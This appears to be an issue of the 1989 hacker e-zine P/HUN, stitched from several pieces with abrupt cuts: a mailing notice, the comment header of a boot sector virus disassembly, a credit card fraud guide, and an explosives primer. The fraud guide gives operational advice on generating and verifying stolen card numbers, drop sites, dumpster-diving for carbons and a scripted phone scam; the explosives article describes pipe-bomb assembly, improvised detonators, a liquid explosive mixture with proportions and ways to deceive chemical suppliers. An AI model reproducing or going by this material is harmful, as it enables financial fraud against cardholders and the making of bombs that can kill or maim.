Introduction:

-------------

Welcome once again to another exiciting issue of P/HUN Magazine.



We are little behind schedule. The delay was caused by a severe disk crash

which wiped out most of the files. The whole issue had to be put back together

again.



This time we have a special segment called P/HUN Telecom News/Advancements,

which contains the latest news in the telecommunications industry as we know

today. This segment will be released on a regular basis. I would like to thank

DareDevil for taking the first shot it. We would appreciate some feedback on

this new concept.



If you have any articles to contribute please get in touch with us at our

BBS or at our Usenet address.

                         The Banishment Of Phrack Inc.

                               -----------------------------

                              by Knight Lightning



                        June 27, 1989 - August 28, 1989



Hello.  This message is being sent to all members of the Phrack Inc. Mailing

List to forewarn you of things to come.  Due to certain policies at the

University Of Missouri - Columbia (UMCVMB), Taran King and I will lose our

Bitnet/Internet accounts on June 27, 1989.  I would advise not sending files or

mail to either of our address after June 26, 1989 just to be safe.



Our "exile" from UMCVMB will last until August 28, 1989 when fall classes

begin.  However, this does not mean we are putting Phrack Inc. on hold by any

means.



Solution:  Anyone who has files to be placed in Phrack Inc. after June 26, 1989

should contact HATCHET MOLLY.  He can be reached at "TK0GRM2@NIU.BITNET" or

"TK0GRM2%NIU.BITNET@CUNYVM.CUNY.EDU".  He will be handling the gathering of

files from you... our network friends.



Phrack Inc. Newsletter Issue 27 will be released within the next TWO WEEKS.  If

you would like to receive this issue, please let me know as soon as possible.

The reason I make mention of this is because many people on the mailing list

are not currently accessing their work station for a variety of reasons

(school's out, on vacation, etc).  So let us know and we will send it to you

when we release it.



The situation with our Bitnet/Internet addresses will not affect SummerCon '89

in any way.  However, any issues of Phrack Inc. that we do release between June

27, 1989 and August 28, 1989 will *NOT* be sent over the networks to you until

September 1989.  Taran King and I will not have access to the network and will

have no way to send these files until then.  So it looks like bulletin boards

and software pirates will get first look during this time period.



So if you have any further questions about this situation, mail us right away.

Remember, any comments or information for Phrack Inc. after June 26, 1989

should be directed to Hatchet Molly.

                             A BOOT SECTOR VIRUS

                                 5/15/89





The following is a disassembled and commented version of the Alemeda

College Boot infector virus.  Courtesy of Southern Cross.





;-----------------------------------------------------------------------;

; This virus is of the "FLOPPY ONLY" variety.                           ;

; It replicates to the boot sector of a floppy disk and when it gains control

; it will move itself to upper memory.  It redirects the keyboard       ;

; interrupt (INT 09H) to look for ALT-CTRL-DEL sequences at which time  ;

; it will attempt to infect any floppy it finds in drive A:.            ;

; It keeps the real boot sector at track 39, sector 8, head 0           ;

; It does not map this sector bad in the fat (unlike the Pakistani Brain)

; and should that area be used by a file, the virus                     ;

; will die.  It also contains no anti detection mechanisms as does the  ;

; BRAIN virus.  It apparently uses head 0, sector 8 and not head 1      ;

; sector 9 because this is common to all floppy formats both single     ;

; sided and double sided.  It does not contain any malevolent TROJAN    ;

; HORSE code.  It does appear to contain a count of how many times it   ;

; has infected other diskettes although this is harmless and the count  ;

; is never accessed.                                                    ;

;                                                                       ;

; Things to note about this virus:                                      ;

; It can not only live through an ALT-CTRL-DEL reboot command, but this ;

; is its primary (only for that matter) means of reproduction to other  ;

; floppy diskettes.  The only way to remove it from an infected system  ;

; is to turn the machine off and reboot an uninfected copy of DOS.      ;

; It is even resident when no floppy is booted but BASIC is loaded      ;

; instead.  Then when ALT-CTRL-DEL is pressed from inside of BASIC,     ;

; it activates and infectes the floppy from which the user is           ;

; attempting to boot.                                                   ;

;                                                                       ;

; Also note that because of the POP CS command to pass control to       ;

; its self in upper memory, this virus does not to work on 80286        ;

; machines (because this is not a valid 80286 instruction).             ;

;                                                                       ;

; The Norton Utilities can be used to identify infected diskettes by    ;

; looking at the boot sector and the DOS SYS utility can be used to     ;

; remove it (unlike the Pakistani Brain).                               ;

                                                         ^

     Within the first group of numbers from the left [called Group 4] the Bank

name and branch are contained. We have already discovered that the first digit

of Group 4 reveals the card type. We will now look at how to decipher which

bank issued the card, and which branch of the bank the actual card holder banks

at. Look at the Second, Third, and Fourth digits of Group 4. These three

numbers tell which bank issued the card. A small list follows this paragraph,

although you can compile a list by yourself. Just glance at cards you get your

hands on which the bank name is printed, and record the information. [ Editor's

Note: This is a hard concept to explain, so let me give you an example. Lets

say Bank of Hicksville's group 4 Visa Credit Card reads 4560. (560 = Bank of

Hicksville). BUT, 4561 is NOT necessarily Bank of Hicksville, too. 4561 could

be Bank of Booniesville. So what I am trying to get across is that the next

bank in line doesn't HAVE to be 4570 -- it could be earlier in numbers. ]

III. Bank Codes [ International Bank or Interlink Numbers]



     These are used in checking credit. Later on, you will learn that while

checking the credit cards for the amount of credit, you will be prompted to

enter the Bank ID along with the Merchant ID. The bank IDs are, I believe, from

the following list. One note-- you cannot just choose any Bank ID and use it

with any merchant ID. They must correspond in some way. How, I don't know. I

THINK that a bank issues a merchant number to each of their customers. If you

try to use a merchant number with a bank number, and the merchant doesn't

actually use the bank that is specified by the bank number, you are going to

get some problems. (ie, the verification won't go through.) Again, I will state

that this is only a theory. The reason that I post this theory is to get minds

working. So far, no one has mentioned their ideas on the function of Bank

Codes. If you do happen to find out the true meaning of these numbers, please

get in touch with me so I can update this list. Thanks. One word- on VISA

credit cards, the bank IDs are the first 4 digits of the Card. For Mastercards,

however, they vary. A list follows:

IV. "Group 3"



Sample Credit Card: 1234 5678 9012 3456

                           ^

                           |

                           |

                         Group 3, or the second group on a credit card in from

the left, contains some VERY useful information about the card. This group

holds the information on the Maximum Expiration Date and the Maximum Credit

Limit. (I believe that you can all see the benefits of this.) This does not

mean, however, that the ACTUAL expiration date and ACTUAL credit limit are in

this group. What it means is this: When the different Credit Card Companies

issue Credit Cards to the consumer, he of course has a credit limit. And when

the Companies formulate credit cards, they create certain groups for certain

customers. That is, certain "groups" contain all the credit cards for people

with a credit limit between $x and $y. The same thing goes with the expiration

dates. Everyone whose card expires after m1/y1 and before m2/y2 has their

credit card in a certain group formulated by the company. For example:

My name is Joe Schmoe. My Visa credit card expires in January of the year 1999.

My credit limit on this card is $7,000. My credit card number (CCN) will

probably be in the same group as my brother-in-law Jack Koff whose card expires

in December of 1998 and whose credit limit is $6,000. BUT, our cards will be in

different groups entirely than my boss' whose card expires in June of 1995 and

whose credit limit is $40,000.

     Back to the point of section IV: Lets say you have a credit card with a

known expiration date and known credit limit. Lets also say that you happen

upon ANOTHER credit card whose numbers are the same up until the last 2 groups.

(You and I see that these two cards were issued by the same bank and PROBABLY

have a credit limit in the same ball park and an expiration date not far from

each other. ) BUT, even though you have this new credit card, you lost the

expiration date and credit limit. GOSH! How are you going to use this card when

you don't know this information?? APROXIMATE! You have a general idea now, and

you can go from there.

     One warning here: I have found that small groups of cards with high credit

limits are often hidden in between large groups of cards with very low credit

limits. For instance, lets look at this card: 4123 4567 8901 2345. From -4567

until 4600 in group 3 (from the right) gold cards may exist. But after 4600 and

before 4567, cards with credit limits of $500 exist. Kind of sucks, huh?? Just

wanted to make you aware of this.

     Now, once you learn how to modify these without hurting the card, you have

increased your value as a carder by 100x. But be careful. Often when you modify

a card's group 3 to get a higher credit limit line of cards, you will find the

entire line is dead. Or, in other cases, just the original card you find is

dead, and all surrounding cards are valid with the new credit limits.



V. "Group 2" & "Group 1"



     These two groups, or the last two groups on the credit card, are the

easiest to modify. By changing these in such a way, you can formulate new

credit cards simply by doing a little math in your head. These two groups

contain the IDentification codes. Later on in your carding careers, you might

find out how to change these, and thus, you have found the secret to a vault of

new and awaiting credit cards. I stress here that the only purpose that these

two groups serve is to differentiate between customers. If the first two groups

of two cards are the same and the last two groups of two cards are different,

the two cards were issued by the same bank and probably have similar credit

limits, but are of course issued to different people.



VI. Credit Card Verification



     Once you have a newly formulated or newly found Credit Card, you must

first check to see if it is valid before you distribute or use it. The reason

for this is this: Although you may not have faltered in your calculations, and

you created a credit card following the correct formula, the card may turn up

as invalid. This is because it has not been issued yet. Visa or Mastercard has

not issued that card to a customer yet. You are ahead of the credit card

company. (Don't you feel important??!) If this case arises, simply formulate a

new credit card from the original valid credit card, and check it once again.

There is no known way around this except to wait.

     OKAY- you want to check your credit card and see how much money this

person has. There are many, many credit verifiers around. The easiest way to

get ahold of one is to go into any store which accepts credit cards and look on

the side of the machine that imprints the carbons with the credit card number,

etc. Or, look right on the wall next to the register. There should be a number

to call, a merchant number, and perhaps a bank number. Jot these down and head

on home. The format for these is usually different, but all have the basic idea

in mind. Call an operator of some sort, tell her the authorization information

that she asks for (bank number,merchant number, etc)  and give her the card and

the amount for which to verify the card. She will check and let you know if it

has enough credit left. Simple. BUT***



 ******************* ONE NOTE **********************

 When you check a card for a certain amount of money, that amount of money is

subtracted from the amount available on the card. For example, if a card has

$5,000 left on it, and you get ahold of it and check it for $2,000, you can

only spend $3,000 before it tells you that you don't have the necessary credit

to go through with a transaction.



VII. Purchasing Merchandise: The Real Story



     OKAY, now that you have a VALID credit card, you will most likely want to

get some newly acquired merchandise. This is all fine and dandy, but if you

don't know what you are doing, you can get yourself and most likely your

friends in a LOT of trouble.





---------------------------------------------------------------------------

*** WARNING : NEVER ORDER SOMETHING FROM YOUR HOUSE. ALWAYS GO OUT TO A ***

*** PAY PHONE. ALSO, ALWAYS HAVE A STORY WORKED OUT BEFORE YOU CALL.    ***

*** THAT IS, YOUR NAME, ADDRESS, JOB, PHONE NUMBER, EXCUSE FOR NOT BEING***

*** HOME, MOTHER'S MAIDEN NAME, ETC. ANY STUTTERING OR HESITATION COULD ***

*** BLOW THE WHOLE SHOW !!!  !!!  !!!  !!!  !!!  !!!  !!!  !!!  !!!  !!!***

---------------------------------------------------------------------------





  FIRST- Let me clarify something. When you order something over the phone, and

the person selling you the items wants to know the actual Cardholder's name,

address, phone number, etc, you DO NOT have to give him/her the correct

information. [UNLESS: You do have to give the person correct information if

they have an online connection to a credit record bureau such as CBI or TRW. In

this case, as they can verify everything that you say in a matter of moments,

just do your best, get a new card, and never order from this company again. I

will not lie to you: some companies do have this capability. But if you stick

with little bussinesses who need your money, you'll do fine. ] Bullshit your

way through. Or hire a social engineer to do it for you. You do not even have

to give the correct expiration date! Almost Any expiration date will work as

long as it is at least one month ahead of the current month and it is not TOO

far ahead in time so that it jumped over the actual expiration date. (ie, if

the current date is 10/89, give the expiration date 11/89 -- simple) The

company from which you are buying things can not verify the extra information

YOU give them until after the order has been processed and the package shipped.

They have to get in touch with a Credit Union, which will be discussed later on

in this summary, to verify it all. * ALL THAT THEY CAN VERIFY PRONTO IS THAT

THE CREDIT CARD IS VALID, AND THAT IT HAS ENOUGH CREDIT TO PAY FOR THE

MERCHANDISE YOU ARE PURCHASING. * My suggestion, however, is that you give them

the phone number of a pay phone near your house. [ Or, if you want to REALLY

make sure things go smoothly, give them the number of a direct dial VMB local

to the shipping address. ] If they want to call you back, FINE. Ask them to do

so between the hours of X pm and Y pm. And, just pitch tent at the phone for a

few hours a night. No problem. They will almost always call right back, since

they don't want to inconvenience their customer who happens to be buying $6,000

worth of computers at the time. Understand?



  SECOND- Where should I ask have them ship it to, you ask? Fret not, my little

friend in carding. Before you call and order your things, first go out and find

an abandoned house. These still work best. Either one that has been moved out

of, and no one has moved into yet. Or, if you can, find one that is REALLY

abandoned. (BUT MAKE SURE IT HAS A STREET ADDRESS THAT THE POSTMAN OR UPS MAN

CAN FIND!) Jot down this address. This is referred to as a drop site.

[ Ed. Note: if, and I say IF you can rent a mailbox, do so. Make sure they sign

for everything (UPS, etc) and bring some FAKE ID with you to open it up. Most

of the time, they will give you hastle, and verify EVERYTHING you give them. So

it is really not that easy to get one of these. At least try, though. ] OKAY,

give this address to the man or lady who is taking your order. Tell them this

is where you live. REMEMBER, they can not verify that you don't live there for

quite a while. They will send everything there. When the shipment comes (either

Overnight, Second Day, or whenever), pick it up (CASUALLY) and stroll home to

open your package. If it does not come, or if the salesperson gives you

trouble, don't worry. If it didn't come, it is because 1) It got intercepted by

the feds or 2) The company didn't process it because they did actually try to

verify your address, name, and phone number, thus delaying your shipment, but

saving themselves a lot of money. Just try another store until you find some

place that is easy to buy from.



  THIRD- I suggest that you do not furnish your household with carded items. It

is just not wise. Get a few things, if you like, and wait a little while. Sit

tight. When things cool down, you might want to get some more things. REMEMBER-

all things are good in proportion, but when you get out of that proportion (ie,

get greedy and order a new house) you will most definately get caught sometime

or another. Patience is the carder's best friend. (along, of course, with the

VISA formula... hehe)



  FOURTH- You have all heard it before. DON'T DISPLAY YOUR SPEICAL TALENT AT

SCHOOL, PARTIES, OR SOCIAL EVENTS. Not even to your best friends. ESPECIALLY

not to your best friends. They are the ones most likely to brag about you and

spread the word. This is the farthest thing from what you want. Keep it to

yourself, and if you must tell someone about it, either call Phone Sex, a

Bridge, or an Alaskan Operator. Those are your only choices, as no other carder

or phreak wants to hear about how good you actually are.



  FIFTH- I wouldn't advise making a bussiness out of this, either. Sure, if you

want to get a few dollars for things you order (and that you don't want

anymore) sell it and keep the money. But its purely asinine to take "orders"

from people for money. And even if you don't want money. Keep in mind that

Credit Fraud IS a felony, and getting caught violating US Federal Laws is not a

fun experience to go through. Do you want to go to jail for 10 years, and never

again be able to get a good job because Joey down the street wanted to pay $10

for a new skateboard that retails for $75?? Thats what I thought. Your whole

goal in life, as long as you participate in the Underground Arts, is to keep a

low profile.



VIII. Getting Credit Cards



     There are a number of ways through which you can get credit cards.



  FIRST- Go trashing. That is, go in back of a bank, department store (make

sure it is not in a mall!), or other store which accepts credit cards. When the

coast is clear, jump in their trash bin. Rummage around a bit. Having a look

out might prove to be wise. What you are looking for are carbons - the carbon

paper which the salesperson throws out after a purchase has been made. Remember

these? It is the device that guarentees you (a legit customer) get a receipt of

your credit card purchase, and also that the store gets a copy for record

keeping. Once you find these, (and making sure you don't rip them) put them in

a bag, pocket, whatever, and get somewhere safe. (home?) Hold them up to the

light, and copy down everything you think is important. Card Number, expiration

date, name, address, bank name, etc... Then BURN the carbons. This destroys all

evidence that you ever had them. From here, you are set. Order away!



   SECOND- If you have a friend that works in a store which performs credit

card transactions, you might save yourself the trouble of banana peals on your

head and ask him/her if they might not mind slipping the carbons into a bag

after they ring up a sale. (or have them copy everything down for you.)



  THIRD- You might try bullshitting people and getting their cards. You have to

be VERY good, and the person has to be VERY stupid for this to work. In my

mind, it is a waste of time, and almost never works. (Because people where I

live are smart, of course..) I am presenting this to you in case you live in a

society of morons. Exploit every area that you possibly can. The conversation

might go something like this:



YOU: "Hello, Mrs. Davis? This is Mr. Off from Security down at Citibank. We

have had a computer breakdown and no more of your VISA transactions can be

processed since we lost your credit card number. Do you think that you can give

me your number again, so I can re-enter it right now?"



Mrs. Davis: "Wait a minute, who is this again?"



YOU: "My name is Jack Off and I am from Citibank Security. (Explain whole

situation to her again )"



Mrs. Davis: "I don't know about this. Can I call you back at a number?"



YOU: "Sure. That's no problem. I understand your reluctance. Here... call me at

my office. Its 555-1212 (pay phone, loop, or bridge which you are at)"



Mrs. Davis: "Ok, bye!"



<CLICK>

<RING...>

YOU: "Hello? This is Jack Off's office, Citibank Security, may I help you?"



Mrs. Davis: "Oh, good. I was afraid you were a phony. Ok, my VISA is xxxx-

xxx-xxx-xxx... "



YOU: "Thank you. We will try to restore your credit limit as soon as possible.

Until then, please refrain from trying to purchase merchandise on your Citibank

Visa Card. Goodbye."



<CLICK>



Neat, huh?



  FOURTH- If are a really advanced Carder, you can get fancy and use a credit

card formula. Great, you're saying to yourself. GIMME GIMME GIMME! Not so

quick. Although several do exist, and I do have a couple of them, I am in a

situation in which I am unable to reveal it. If you are particularly smart and

intelligent, you can develope it yourself. Actually, it is not that hard if you

have the means. MAYBE if you are good at math....



  FIFTH- You may try to get credit cards from other people. (friends?) I

stronly recommend against this. Usually the cards you get from other people

have usually already been used and are either being watched or are already

dead.



  SIXTH- If you have access to a Credit Union, you can call and "pull" someone

else's account. (For instance, if you know someone's name and address, or

social security, you can take a look at all of their loans and credit cards. )







IX. Advanced "Carding" Techniques



     Please, people, I beg of you -- If you have not been carding for a year or

two (AT LEAST) do not read this information. It will only confuse you, and even

if you understand it, it will not work as it should unless you have the

experience you are lacking. So sit tight and practice with parts I-VIII.

PLEASE!



     If, perchance, you happen to have the experience necessary to read on,

then enjoy this. The following are simply a few details, hints, etc, that I

just left out of the original manuscript due to my horrendous memory. Add to it

if you like, and pass it a long. We all need to help each other if we are going

to survive. Also, the following are in no particular order except that which

they come to my head.



1) For a drop site, you can try to get fancy if need be. I have heard of empty

military huts being used as well as empty condos, empty houses whose owners are

on vacation, and about a zillion other stories. If you think you have come

across something new, think a plan up, think it over, and think it over again.

Make sure you have every step down so when you order, pick up, and make your

escape, there are no problems. Think about it . . . what harm does it do to

spend an hour making sure you didn't overlook something. It is a lot better

than going there and getting caught.



2) Sometimes the places you order from will have an online account with a

credit record bereau. (Such as TRW, CBI or Transunion) The horrifying fact is

that they can verify ONLINE ANY information that you give them. So, you're

busted, right? Wrong . . .

If this happens, there is nothing you can do unless you have a lot of power

with phones. Chances are, you don't. So play it cool and give an excuse to get

off the phone. Just try somewhere else. Also, if you don't do this right, you

will probably kill the credit card.





X. Credit Unions



     Credit Unions basically are databases that hold information of its

members. When you apply for a credit card, I think that the application to be a

member of a Credit Union is presented also. Since almost EVERY person who owns

a credit card has personal information in at least one of these services, then

there is no fooling he who has access to these services. Many times in your

carding career, you will run into a bussiness who has an online connection to

such unions. If you try to present false information they will catch you and

follow up with the appropriate actions. (That is, report the credit card you

said is yours as dead, call the authorities, etc, etc.)

     Two of the major Credit Bureaus in the United States are TRW and CBI. As

these two services hold large bases of information on its members (ie, every

credit card holder in America), many unauthorized personnel often wish to gain

access to them. They are accessed through a computer by calling a Bureau port

and entering authorization passwords.

     For CBI, the passwords are in the format of nnnllnnn-**, where n=a number

0-9; where l=a letter from a-z; and where *=any character.

     For TRW, the passwords are in the form of lllnnnnnnnlnl. (using the same

key as CBI.)

     As you can see from the length and complexity of these passwords, it is

literally impossible to hack them. (ie, hack in the sense guess them.) So you

are probably wondering how unauthorized persons gain access, huh? Well, we

either have inside information or we go trashing. Thats it.

     Right now, however, I am not going to go any further into the subject of

credit unions. Be aware that they exist, and they can help you as well as hurt

you if you don't know what you are doing. At a later date I plan on devoting an

entire file to the subject of credit unions, as I haven't seen an up-to-date

file in years.







Thats about all. I wish you all good luck, and may your adventures be safe and

fun-filled. And if I EVER catch any of you giving out the credit formula (once

you discover it..) I am going to personally fly over and kick your ass.

(remember- I have carded tickets around the country many times. There is

nothing to stop me from visiting YOUR town.. hahaha)



One final note -- VISA is planning on changing their credit formula within a

few years. So if you happen to be reading this many a year down the line, you

will most likely discover that some of this is no longer valid. DONT BLAME ME.

It was valid at the time when I compiled it.

Other Things to Do



1] Plane Tickets



     It is relatively easy to order plane tickets using a credit card nowadays.

And, for convenience, you can order over the phone. Well, look up your favorite

airline, call them, and present them with the situation. You would like 2

executive class tickets to Florida [ Ed. Note - If you live in Florida, make it

a trip to California ] round trip to be billed to your Visa Credit Card. Oh

sure, maam. My credit card number is <blank>. My expiration date is <blank>. My

Name is Joe Schmoe. I live at 223 Hard On Lane, Pubic Hair, PA. Oh, and maam,

could you PLEEAZE hold the tickets at the airport for me. I will present some

identification to pick them up there. Thank you.

     It is relatively easy to do this. But, there are a few catches.



          A.) Do NOT stay for any long period of time at any one place. After

              few days, the airline will catch on to what you have done. My

              suggestion is that you stay for only about 2 to 3 days. Or, if

              you really want to stay for a long time, get a one way ticket to

              wherever it is that you would like to go to. Stay however long

              you want to stay and take another 1 way ticket home.



          B.) If you plan on traveling around the country, catch one way

              tickets around from place to place. And please, USE DIFFERENT

              AIRLINES!



2] Motorcycles



     Again, you would be surprised at the amount of work (or lack of it)

required to aquire motorcycles on other people's credit cards. I believe you

can all see the advantages, so let us get down to the procedure. First, set up

an order under a corporate account. You can find these sometimes if you work in

a store that would use such cards. (Look over shoulders) Well, I will leave to

you the methods to come upon corporate account cards. Once you have them,

finish the procedure. Step 2 is to send an "employee" (yourself or a stupid

friend) to pick it up. Bring proper identification that was issued from the

corporation. (I suggest making your own -- Not very hard). Offer a Voice Mail

Box as your bussiness number. It is very common for a high level employee to be

absent from his desk. Use your imagination for the rest, and tidy it up to

perfect it.



3] Travelers Cheques



     OKAY, I will admit this is getting out of hand, but what the hell -- For

those of you very daring and in possession of a very good form of false

identification (Birth Certificate?), you can easily order some American Express

Traveler's Cheques for your travels around the world. The number to call is

1-800-777-7337. Using your American Express Credit Card, order some of these

"babies" in another name. (For a gift..) Have them delivered as you deem

appropriate. Enjoy them thouroughly.

[ Ed. Note: This number is active as of 12-20-88. I don't know if these offer

this service year round. Find out! ]

                            INTRODUCTION



I know of all of you phreaks, hackers, etc. out there are interested

in any kind of information that the public usually does not publicize.

This is why I have wrote this phile - to inform you. I also feel that

I should volunteer this information to PHUN because I have obtained

much useful information from that publication and others. I think that

anyone with good knowledge should teach it to their phriends because

we are becoming a dumb race due to the enlightened attitude of the

population from influences such as yuppies, geeks, skateboard freaks,

subliminal brainwashing, bloated bureaucrats, and lazy legislatures.

We must try to become free THINKING people so our brains do not atrophy.

Don't let any of the above influences brainwash you into a quivering

pathetic mass of gelatin like so many people are now. Use any

information from philes you read to benefit you and rid of the

bastards out to get you!!!



At any rate, lets get on with it...The field of explosives is a very

interesting one to study. It can be fun, and it can be dangerous at

the same time. One must exercise great caution when assembling any

type of explosive device since most are sensitive to jarring, rough

handling, friction, static, and other influences. THIS INCLUDES

MIXING ANY CHEMICALS OR EXPLOSIVES TOGETHER.



            DO NOT EVER MIX ANY EXPLOSIVE FORMULA TOGETHER WITH

           ANOTHER UNLESS YOU WANT YOUR BODY EVAPORATED OR AT THE

                   LEAST, LIMBS REMOVED OR EYES BLINDED.



If you are uncertain of an explosive formula you have found in an

anarchist book or on some BBS, don't make it. As a matter of fact,

don't trust to many philes you see and only believe the reputable

books such as "The Poor Man's James Bond I & II", the "CIA Black

Books", and army field manuals. I also ran across some new books

called "Kitchen Improvised Explosives", which can be had from a

radical book company called LOOMPANICS UNLIMITED P.O. Box 1197, Port

Townsend, WA 98368. They are also a very good source for information

but the procedures outlined require more lab apparatus.



It is also a good idea to take some chemistry classes. Take advantage

of chemistry in high school if you are still there. You can learn a lot

if you pay attention and read ahead of your teacher. Try to get on his

good side so he will let you perform "extracurricular activities" in

the school lab. You can learn a lot by doing experiments and you can

also have access to chemicals and expensive lab ware which I find is

necessary to safely make many explosive compounds. If you are out of

school, and you want to get serious about explosives, take a chemistry

class or two at your local college. Call your local Technical school

if you have one and ask them if they are offering any miners blasting

seminars in the future (yes these do exist). If not, call your local

bureau of mines and inquire. Some "social engineering" may be

necessary when talking to them though.



One should at least go to the local library and look for explosive

books and check the encyclopedias for "scratch the surface"

information. If you know a little about chemistry, get the book "The

Chemistry of Powder and Explosives" by Tenny L. Davis. You can obtain

journal footnotes from such books and do further research in "Chemical

Abstracts" and "The Journal of the American Chemical Society" along

with many others; all obtainable from a halfway decent college

library in the reference section.

             __________________________________________



                           EXPLOSIVE TYPES



Basically, there are two types - low and high. The low explosives are

chemical compounds such as black powder, flash powder, match head

powder, etc. These compounds do not necessarily explode but have more

of a burning characteristic. They will propagate into an explosion

when confined in a solid container such as a "pipe-bomb" so the gases

they produce can expand forcefully instead of burning away in the open

air. Black powder for instance detonates at about 300 meters per

second, which roughly means if you make a "train" or line of it 300

meters long, and detonate it with a blasting cap at one end of the

train, the chain reaction and decomposition of the whole train will

take one second. And black powder releases about 12000 PSI when confined

in nominal 2" water pipe with a wall thickness of 1/8" and detonated

with a No. 8 blasting cap (this is a standard size blasting cap that

coal miners and the military uses). Notice I said that it must be

detonated. You cannot just stick a wick in the pipe and light it because

more that likely it will only burn and make a big fire. I will talk more

about detonation later. 2,4,6-Trinitrotoluene (TNT) detonates at about

7400 meters per second when cast loaded into a container. TNT is a high

explosive and its subsequential confinement in a container is not as

important as with low explosives. High explosives are chemical compounds

that will explode regardless of containment. You could lay a big pile

of TNT on the ground, lay a blasting cap on top of it, light the wick,

and the whole mess will still explode. High explosives undergo a

chemical reaction of decomposition in less that a millionth of a second.

All of the energy is released instantaneously. Low explosives, such as

black powder have more of a burning characteristic. High explosives not

only detonate much quicker, but also release more energy. TNT releases

about 4.24 million PSI and the military explosive C-4 releases about 5.7

million PSI and detonates at 8100 meters per second!

            _____________________________________________



                              DETONATION



Most high explosives are not capable of detonating without being set off

or initiated with another explosion. This is done with the help of those

neat little goodies called blasting caps. They contain medium to high

explosives also, but their chemical composition(s) are unstable and will

detonate when fire or spark is introduced to them. You may ask then why

not just use blasting cap explosive instead of regular high explosives.

Well, blasting cap materials are VERY sensitive to shock, friction, etc.

and are also not as efficient as regular high explosives.



Anyway, the blasting cap is usually placed in the high explosive in a

well dug in the high explosive. An example would be like this in a pipe

bomb:



                                     _______ Blasting cap

                                    /

                               !-- * --!

                               !   *   !

                               !   *   !

                               !       !_____ Pipe bomb

                               !       !

                               !       !

                               !       !

                               !       !

                               !-------!





                     (please excuse the ASCII drawing)





When the cap is detonated, the explosive wave it generates is directed

downward and detonates the high explosive in a "chain reaction".

This is why the bottom of the explosive container should be placed on

the target. The peak of the propagated explosive wave will be at the

bottom of the explosive charge...



At any rate, I do not suggest that one attempts to manufacture blasting

caps without knowledge in explosive handling safety and also the proper

laboratory procedures when making the blasting cap explosive itself.



I have made over 300 blasting caps without an accident. I also take very

careful precautions before assembling the caps and I have a properly

equipped laboratory to synthesize the explosive material. I always work

in a controlled environment with accurate measuring equipment for any

explosive experiment I partake in. It is necessary to work under a lab

fume hood to vent any toxic gases produced during experiments. It is also

a good idea to ground yourself and your work area so static electricity

doesn't wreak havoc and blow your chemical up in your face.



IT IS GOSPEL TO FOLLOW DIRECTIONS WHEN DOING ANY EXPERIMENT. ESPECIALLY

WITH EXPLOSIVES. Outline your explosive production procedure before

proceeding with any experiment.



Refer to literature at your local library concerning blasting cap mfg.

before you attempt to make them. The book I mentioned "The Chemistry of

Powder and Explosives" covers the subject very well. There are also some

good books available from Paladin Press on explosive manufacture and the

blasting cap manufacture.



It is possible to create blasting caps in a "kitchen" type environment,

but I do not recommend it because of the dangers involved when making

the explosive components. Many of the starting materials are corrosive

and toxic. Blasting cap explosives are also VERY sensitive. More so than

nitroglycerine in some cases. For instance, Lead azide, the most popular

blasting cap explosive today, when synthesized improperly, can grow into

crystals in the starting agent solution and spontaneously explode just

because of improper stirring and/or cooling. Very easy mistake to do.

Mercury fulminate, one of the cheapest and easiest to synthesize,

produces toxic gases when synthesizing. When the finished product is dry,

it is sensitive to a 2cm drop of a 5 lb. weight. THAT IS SENSITIVE!



ALTERNATIVE:



After all of this negative talk of blasting caps leaves much to be

desired. But there is an alternative to using blasting caps if one has

access to firecrackers such as M-80's, M-100's, M-200's, cherry bombs,

Maroons, etc. These little bombs themselves are sufficient enough to

detonate many high explosives. All of the "nitro" compounds will

detonate with one of these firecrackers. Their use would be the same

as the blasting cap - inserted in a little "well" made in the explosive

charge, sealing off, and their fuse ignited accordingly.



            ____________________________________________



                        MAIN EXPLOSIVE CHARGE



This is the big working explosive. The one that does the big damage.

It should be handled with the same precautions as blasting caps, but

in many cases, can be as safe as handling fertilizer.



Some examples of common high explosives are ditching dynamite, gelatin

dynamite, ANFO (ammonium nitrate fertilizer/fuel oil), TNT, PETN, RDX,

military plastics, and even smokeless powder.



These explosives are easily made in some cases, and dangerous at the

same time. Since it is beyond the scope of this article, I must refer

everybody to your local library, the books I have mentioned, or most of

the "unusual" book publishers. Just do research in all possible material

before grabbing a book and running out, buying the chemicals, and

throwing stuff together. Get yourself a few of the "black-books", the

"Poor Man's James Bond volumes", etc. and compare them with each other.

Don't trust any unheard of publishers or books.



It goes the same for the main charge; if one doesn't have access to the

necessary chemicals, one can improvise. For instance the smokeless

powders available from gunsmith's and reloading shops contain high-

explosives such as nitrocellulose and nitroglycerine. They are called

double based propellants. An example is made by Hercules Powder co.

called "Bullseye" pistol propellant. It contains:



 48% Nitroglycerine

 50% Nitrocellulose

  2% Flash suppressants, stabilizers, etc.



It will detonate at about 7200 meters/sec. when firmly packed in 2 inch

wide, schedule 40 hardened steel pipe. It detonates with 2,000,000 PSI

also. This should suffice for many operations.



I myself placed 1 1/2 pounds of the powder in a three pound coffee can

and detonated it with an M-80 firecracker and it left a ditch in hard

packed clay-soil about 2 feet deep and 3 feet wide! It was simply placed

on the ground with the bottom of the can down. The blast was plainly

heard indoors 1 mile away! Please if you attempt such a blast, make sure

you give yourself ample time to get at least 300 yards away and don't

detonate it near any buildings within 50-75 yards because the air-blast

will possibly crack their windows. I usually use a lit cigarette placed

on the fuse of the cap or firecracker. This will give you about 10 min.

delay depending on the temperature and wind conditions. Packing the

cigarette will give a longer delay.



Another good explosive, if you prefer a liquid explosive is a mixture of

Nitromethane and amine based compounds such as aniline, ethylenediamine,

and for anyone that can't obtain the above chemicals, regular household

ammonia will work as long as it is the clear non-detergent brand.

The Nitromethane can be had from any "speed-shop" or race car parts

supplier. It usually runs about $20 to $30 bucks a gallon. Simply mix the

two liquids: 96% nitromethane and 4% ammonia (by weight). This explosive

has the disadvantage of being somewhat insensitive. You need at least

a No. 8 blasting cap to detonate it. It only need be confined in any kind

of capped bottle and the blasting cap inserted in the neck. The blasting

cap should be dipped in wax before immersion in the liquid explosive.

Some Nitromethane manufactures add a indicator dye that turns purple when

the liquid becomes dangerously explosive. So, when you mix your ammonia

with the Nitromethane and the solution turns purple, you know that you

have done well!

            ________________________________________



                 OBTAINING CHEMICALS AND LAB WARE



Getting your chemicals and lab ware can present a problem in some cases.

In order to order laboratory chemicals, one must be a company, or

try to prove that you are a company. Most suppliers don't like to sell

to individuals in fear of clandestine drug and explosive manufacture.

Those same companies also can be fooled easily with homemade letterhead

also. For those of you with laser printers, the sky is the limit. If

you don't have a laser printer, you should visit your local print shop.

First, simply call the chemical companies and request for a catalog.

You must get on the phone and say something on the order of:

"Hello...this is C.B.G. Water Treatment Corp., may I speak to sales

please? I would like to order your most recent catalog..."

